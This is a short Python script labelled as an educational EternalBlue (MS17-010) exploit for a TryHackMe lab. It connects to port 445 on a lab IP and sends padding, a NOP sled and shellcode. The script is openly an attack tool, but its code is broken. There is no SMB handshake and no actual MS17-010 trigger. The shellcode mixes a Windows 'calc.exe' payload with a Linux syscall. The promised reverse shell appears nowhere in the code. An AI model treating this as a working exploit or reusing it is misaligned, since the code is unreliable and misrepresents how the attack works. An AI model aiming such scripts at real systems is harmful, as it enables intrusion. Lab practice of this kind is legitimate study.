#!/usr/bin/env python3
# exploit.py - Simulated EternalBlue Trigger (Educational Only)
# TryHackMe: Blue - MS17-010

import socket
import struct

TARGET = "10.10.10.40"
PORT = 445

def create_payload():
    # Payload ساده (فقط برای نمایش)
    shellcode = (
        b"\x90" * 16 +  # NOP sled
        b"\x31\xc0\x50\x68\x63\x61\x6c\x63\x54\x59\x50\x50" +  # calc.exe
        b"\x89\xe1\x83\xc1\x0b\xcd\x80"
    )
    return shellcode

def send_exploit():
    print(f"[+] Connecting to {TARGET}:{PORT}")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((TARGET, PORT))
    
    payload = create_payload()
    packet = b"A" * 1024 + payload + b"\r\n"
    
    print(f"[+] Sending {len(packet)} bytes of payload...")
    s.send(packet)
    response = s.recv(4096)
    print(f"[+] Response: {response[:100]}...")
    s.close()
    print("[!] Exploit sent! Check for reverse shell.")

if __name__ == "__main__":
    send_exploit()